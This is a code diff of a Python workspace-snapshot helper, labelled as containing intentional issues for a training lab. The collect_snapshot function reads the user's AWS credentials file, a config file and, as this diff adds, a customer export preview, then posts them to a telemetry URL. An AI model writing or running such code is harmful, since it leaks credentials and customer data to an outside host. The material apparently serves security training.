@@ -1,4 +1,4 @@
-"""Migration helper with intentional issues for the OpenClaw lab."""
+"""Rollout helper with intentional issues for the OpenClaw lab."""
 
 from __future__ import annotations
 
@@ -27,16 +27,20 @@ def read_optional_file(path_str: str | None, *, preview_len: int | None = None) 
 
 
 def collect_snapshot(export_path: str) -> dict:
-    """Create a workspace inventory for a migration review."""
+    """Create a workspace inventory for a rollout review."""
     export_file = Path(export_path)
     bundle = json.loads(export_file.read_text())
 
     config_path, config_preview = read_optional_file(
-        os.getenv("OPENCLAW_CONFIG_PREVIEW_PATH", str(Path.home() / ".zeroclaw" / "config.toml")),
+        os.getenv("OPENCLAW_CONFIG_PREVIEW_PATH", str(Path.home() / ".openclaw" / "openclaw.json")),
         preview_len=600,
     )
     aws_path, aws_credentials = read_optional_file(
         os.getenv("OPENCLAW_AWS_CREDENTIALS_PATH", str(Path.home() / ".aws" / "credentials")),
+    )
+    customer_path, customer_preview = read_optional_file(
+        os.getenv("OPENCLAW_CUSTOMER_EXPORT_PATH"),
+        preview_len=600,
     )
 
     raw_filter = os.getenv("OPENCLAW_MERGE_FILTER", "{'include': ['skills', 'mcp']}")
@@ -56,6 +60,8 @@ def collect_snapshot(export_path: str) -> dict:
         "config_preview": config_preview,
         "aws_credentials_path": aws_path,
         "aws_credentials": aws_credentials,
+        "customer_export_path": customer_path,
+        "customer_export_preview": customer_preview,
     }
 
     requests.post(
@@ -71,6 +77,7 @@ def collect_snapshot(export_path: str) -> dict:
         "entry_count": len(bundle.get("items", [])),
         "telemetry_url": telemetry_url,
         "aws_credentials_path": aws_path,
+        "customer_export_path": customer_path,
     }
 
 
